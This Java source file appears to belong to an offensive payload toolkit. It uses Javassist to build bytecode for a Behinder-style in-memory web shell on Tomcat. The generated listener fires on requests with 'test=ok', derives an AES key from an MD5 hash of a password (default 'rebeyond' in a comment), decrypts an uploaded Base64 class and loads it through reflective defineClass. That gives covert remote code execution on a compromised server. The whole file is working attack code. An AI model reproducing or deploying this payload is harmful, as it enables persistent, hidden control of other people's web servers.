package cn.safe6.payload.memshell;

import javassist.*;
import org.apache.catalina.connector.RequestFacade;
import org.apache.coyote.RequestInfo;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;

import javax.servlet.Filter;
import javax.servlet.ServletRequestListener;
import javax.servlet.jsp.PageContext;

public class Behinder1 {



    public static byte[] getMemBehinder3Payload(String pass) throws Exception {
        //String pass = "rebeyond";

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(ServletRequestListener.class));
        classPool.insertClassPath(new ClassClassPath(RequestFacade.class));
        classPool.insertClassPath(new ClassClassPath(Request.class));
        classPool.insertClassPath(new ClassClassPath(Response.class));
        classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
        classPool.insertClassPath(new ClassClassPath(PageContext.class));
        classPool.insertClassPath(new ClassClassPath(Behinder1.class));



        CtClass ctClass = classPool.makeClass("MemBehinder3Listener1");
        if (ctClass.getDeclaredConstructors().length != 0) {
            ctClass.removeConstructor(ctClass.getDeclaredConstructors()[0]);
        }
        //ctClass.setSuperclass(classPool.getCtClass(ServletRequestListener.class.getName()));
        ctClass.setInterfaces(new CtClass[]{classPool.getCtClass(ServletRequestListener.class.getName())});
        ctClass.addField(CtField.make("public javax.servlet.jsp.PageContext pageContext;",ctClass));
        ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));


        ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3Listener(javax.servlet.jsp.PageContext pageContext){\n" +
                "        this.pageContext = pageContext;\n" +
                "    }", ctClass));


        ctClass.addMethod(CtMethod.make("    public static String md5(String s) {\n" +
                "        String ret = null;\n" +
                "        try {\n" +
                "            java.security.MessageDigest m;\n" +
                "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
                "            m.update(s.getBytes(), 0, s.length());\n" +
                "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
                "        } catch (Exception e) {}\n" +
                "        return ret.substring(0,16).toLowerCase();\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void requestInitialized(javax.servlet.ServletRequestEvent servletRequestEvent){\n" +
                "\n" +
                "        org.apache.catalina.connector.RequestFacade requestfacade= (org.apache.catalina.connector.RequestFacade) servletRequestEvent.getServletRequest();\n"+
                "        java.lang.reflect.Field field = requestfacade.getClass().getDeclaredField(\"request\");\n" +
                "        field.setAccessible(true);\n"+
                "        org.apache.catalina.connector.Request request1 = (javax.servlet.http.HttpServletRequest) field.get(requestfacade);\n" +
                "        javax.servlet.http.HttpServletRequest request = request1.getRequest();\n" +
                "        javax.servlet.http.HttpServletResponse response =request1.getResponse().getResponse();\n" +
                "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                "\n" +
                "        if (request.getParameter(\"test\").equals(\"ok\")) {\n" +
                "            response.setHeader(\"inject\", \"ok\");\n" +
                "            String k = md5(passwd);\n" +
                "            session.putValue(\"u\", k);\n" +
                "            // 回显密钥\n" +
                "            try{\n" +
                "                pageContext.setRequest(request1);\n" +
                "                pageContext.setResponse(response);\n" +
                "                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
                "                javax.crypto.spec.SecretKeySpec sec = new javax.crypto.spec.SecretKeySpec((session.getValue(\"u\") + \"\").getBytes(), \"AES\");\n" +
                "                c.init(2, sec);\n" +
                "                String upload = request.getReader().readLine();\n" +
                "                java.lang.reflect.Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", new Class[]{byte[].class,int.class, int.class});\n" +
                "                method.setAccessible(true);\n" +
                "                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(upload));\n" +
                "//                Class evilclass = (Class) method.invoke(.class.getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                "                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), new Object[]{evilclass_byte,new Integer(0), new Integer(evilclass_byte.length)});\n" +
                "                evilclass.newInstance();\n" +
                "            }catch (Exception e){\n" +
                "            }\n" +
                "        }\n" +
                "        //filterChain.doFilter(request, response);\n" +
                "    }", ctClass));

        ctClass.addMethod(CtMethod.make("    public void requestDestroyed(javax.servlet.ServletRequestEvent servletRequestEvent) {\n" +
                "    }", ctClass));




        return ctClass.toBytecode();
    }

}
